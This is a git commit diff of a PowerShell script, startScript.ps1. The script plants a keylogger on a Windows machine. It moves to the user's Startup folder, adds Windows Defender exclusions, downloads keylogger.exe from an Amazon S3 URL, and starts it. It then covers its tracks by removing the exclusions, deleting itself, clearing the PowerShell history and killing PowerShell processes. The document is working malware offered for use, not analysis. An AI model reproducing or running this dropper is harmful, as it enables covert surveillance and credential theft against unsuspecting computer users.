71adee1e07f9e8ab76bc2c6a2bab9a6424b2a5a2
tuconnaisyouknow <yenghele@fayou.cloud>
2022-03-29 19:17:17 +0200

    Update startScript.ps1

--- startScript.ps1
+++ startScript.ps1
@@ -1,11 +1,11 @@
-cd $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup #Go to the folder in which we will donwload files
+Set-Location $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup #Go to the folder in which we will donwload files
 Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
-wget LINK -O keylogger.exe #Download keylogger script
+Invoke-WebRequest "https://tuconnaisyouknow.s3.eu-west-3.amazonaws.com/keylogger.exe" -O keylogger.exe #Download keylogger script
 Add-MpPreference -ExclusionPath $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup\keylogger.exe -Force #Add exception for keylogger.exe file in antivirus
-start keylogger.exe #Start keylogger script
+Start-Process keylogger.exe #Start keylogger script
 Remove-MpPreference -ExclusionExtension exe -Force #Reser .exe files exception in antivirus
 Remove-MpPreference -ExclusionExtension ps1 -Force #Reset .ps1 files exception in antivirus
 Set-ExecutionPolicy restricted -Force #Reset script execution policy
-del C:\Users\Public\Documents\startScript.ps1 #Delete startScript.ps1 file
-Clear-Content (Get-PSReadlineOption).HistorySavePath #Clear all powershell commands history
-taskkill -F /IM powershell.exe #Kill all powershell process
+Remove-Item C:\Users\Public\Documents\startScript.ps1
+Clear-Content (Get-PSReadlineOption).HistorySavePath
+taskkill -F /IM powershell.exe
